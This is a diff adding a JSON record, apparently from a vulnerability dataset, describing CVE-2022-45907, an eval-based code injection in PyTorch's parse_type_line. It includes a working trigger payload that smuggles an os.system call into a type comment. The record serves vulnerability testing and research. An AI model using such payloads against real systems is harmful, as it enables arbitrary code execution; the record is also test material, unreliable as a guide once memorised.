@@ -1,0 +1,15 @@
+{
+  "file_id": "210_torch_issue_88868",
+  "numeric_id": "210",
+  "library_hint": "torch",
+  "source": "github_issue",
+  "title": "Command injection vulnerability in torch.jit.annotations.parse_type_line due to unsafe use of eval",
+  "cve": "CVE-2022-45907",
+  "cwe": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+  "library": "pytorch",
+  "affected_version": ">= 1.0, < 1.13.1",
+  "vulnerable_function": "torch.jit.annotations.parse_type_line",
+  "triggerability": "indirect",
+  "trigger_payload": "import torch\ntorch.jit.annotations.parse_type_line('# type: __import__(\"os\").system(\"ls\") -> 234', None, 1)",
+  "oracle": "arbitrary code execution (e.g., command execution via os.system)"
+}
